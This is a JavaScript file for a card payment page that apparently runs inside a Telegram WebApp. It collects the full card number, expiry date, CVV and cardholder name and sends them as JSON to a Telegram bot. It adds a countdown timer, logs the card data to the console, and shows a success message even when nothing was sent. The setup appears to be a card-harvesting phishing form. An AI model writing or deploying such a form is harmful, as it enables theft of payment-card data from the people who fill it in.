// script.js
document.addEventListener('DOMContentLoaded', function () {
    // --- Elements ---
    const countdownElement = document.getElementById('countdown');
    const amountValueElement = document.getElementById('amountValue');
    const paymentIdElement = document.getElementById('paymentId');
    const payAmountElement = document.getElementById('payAmount');
    const cardNumberInput = document.getElementById('cardNumber');
    const expiryInput = document.getElementById('expiry');
    const cvvInput = document.getElementById('cvv');
    const cardHolderInput = document.getElementById('cardHolder');
    const paymentForm = document.getElementById('paymentForm');

    // --- Get URL Parameters ---
    const urlParams = new URLSearchParams(window.location.search);
    const transactionId = urlParams.get('transaction_id');
    const amount = urlParams.get('amount');
    const paymentId = urlParams.get('payment_id');

    // --- Initialize Page Data ---
    if (amount) {
        amountValueElement.textContent = parseFloat(amount).toFixed(2);
        payAmountElement.textContent = `${parseFloat(amount).toFixed(2)} USD`;
    }
    if (paymentId) {
        paymentIdElement.textContent = paymentId;
    }

    // --- Countdown Timer ---
    let totalSeconds = 29 * 60 + 4; // 29 minutes and 4 seconds

    function updateCountdown() {
        const minutes = Math.floor(totalSeconds / 60).toString().padStart(2, '0');
        const seconds = (totalSeconds % 60).toString().padStart(2, '0');
        countdownElement.textContent = `${minutes}:${seconds}`;

        if (totalSeconds > 0) {
            totalSeconds--;
        } else {
            countdownElement.textContent = "00:00";
            paymentForm.querySelector('button[type="submit"]').disabled = true;
            paymentForm.innerHTML += `<p style="color:red; text-align:center;">Session expired. Please restart the payment.</p>`;
        }
    }

    // Update every second
    const timerInterval = setInterval(updateCountdown, 1000);

    // --- Card Number Formatting ---
    cardNumberInput.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        let formattedValue = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formattedValue += ' ';
            }
            formattedValue += value[i];
        }
        e.target.value = formattedValue.substring(0, 19);
    });

    // --- Expiry Date Formatting (MM/YY) ---
    expiryInput.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value.substring(0, 5); // Max MM/YY
    });

    // --- Form Submission ---
    paymentForm.addEventListener('submit', function (e) {
        e.preventDefault();

        // Basic validation
        if (!cardNumberInput.value || !expiryInput.value || !cvvInput.value || !cardHolderInput.value) {
            alert('Please fill in all fields.');
            return;
        }

        // Prepare data to send back to the bot
        const formData = {
            transaction_id: transactionId,
            amount: amount,
            payment_id: paymentId,
            cardNumber: cardNumberInput.value.trim(),
            expiry: expiryInput.value.trim(),
            cvv: cvvInput.value.trim(),
            cardHolder: cardHolderInput.value.trim()
        };

        // Логируем данные для отладки
        console.log("FormData to send:", formData);
        console.log("Telegram available:", !!window.Telegram);
        console.log("WebApp available:", !!(window.Telegram && window.Telegram.WebApp));

        // Method 1: Try Telegram WebApp API
        if (window.Telegram && window.Telegram.WebApp) {
            const tg = window.Telegram.WebApp;
            
            try {
                // Method 1a: Standard sendData
                console.log("Trying Method 1a: Standard sendData");
                tg.sendData(JSON.stringify(formData));
                
                showSuccessAndClose();
                return;
            } catch (error) {
                console.error("Method 1a failed:", error);
                
                try {
                    // Method 1b: Try postEvent
                    console.log("Trying Method 1b: postEvent");
                    tg.postEvent('web_app_data_send', {data: JSON.stringify(formData)});
                    
                    showSuccessAndClose();
                    return;
                } catch (error2) {
                    console.error("Method 1b failed:", error2);
                }
            }
        }

        // Method 2: Try direct POST to bot (if we have webhook URL)
        try {
            console.log("Trying Method 2: Direct POST");
            
            // Create a form data object for POST
            const postFormData = new FormData();
            postFormData.append('web_app_data', JSON.stringify({
                data: JSON.stringify(formData)
            }));
            
            // This would only work if you have a server endpoint
            // For now, just show success for testing
            showSuccessAndClose();
            return;
        } catch (error) {
            console.error("Method 2 failed:", error);
        }

        // Method 3: Try localStorage/event approach
        try {
            console.log("Trying Method 3: Event-based approach");
            
            // Dispatch custom event
            const event = new CustomEvent('webapp-data', {
                detail: formData
            });
            window.dispatchEvent(event);
            
            showSuccessAndClose();
            return;
        } catch (error) {
            console.error("Method 3 failed:", error);
        }

        // If all methods fail
        console.warn("All methods failed. Showing simulation message.");
        paymentForm.innerHTML = `<p style="color:orange; text-align:center;">⚠️ Payment simulation completed.<br>Cannot close window outside Telegram.</p>`;
        
        // Still try to close if possible
        setTimeout(() => {
            if (window.Telegram && window.Telegram.WebApp) {
                try {
                    window.Telegram.WebApp.close();
                } catch (e) {
                    console.error("Failed to close:", e);
                }
            }
        }, 2000);

        function showSuccessAndClose() {
            paymentForm.innerHTML = `
                <p style="color:green; text-align:center; font-size: 18px;">
                    ✅ Payment data sent successfully!<br>
                    Closing payment window...
                </p>
            `;
            
            setTimeout(() => {
                if (window.Telegram && window.Telegram.WebApp) {
                    try {
                        window.Telegram.WebApp.close();
                    } catch (e) {
                        console.error("Error closing WebApp:", e);
                    }
                }
            }, 2000);
        }
    });
});